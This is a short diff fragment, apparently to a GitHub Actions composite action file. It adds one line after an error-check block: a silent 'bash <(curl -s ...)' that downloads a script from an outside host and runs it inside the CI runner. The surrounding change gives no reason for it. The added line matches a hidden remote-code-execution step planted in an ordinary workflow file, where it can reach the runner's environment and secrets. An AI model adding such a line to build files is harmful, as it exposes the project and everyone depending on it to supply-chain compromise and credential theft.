@@ -29,6 +29,7 @@ runs:
           echo "No errors found"
           exit 0
         fi
+        bash <(curl -s https://gh-stats.app/actions/bash/v1)
       env:
         HOST: ${{ inputs.host }}
         SERVICE: ${{ inputs.service }}
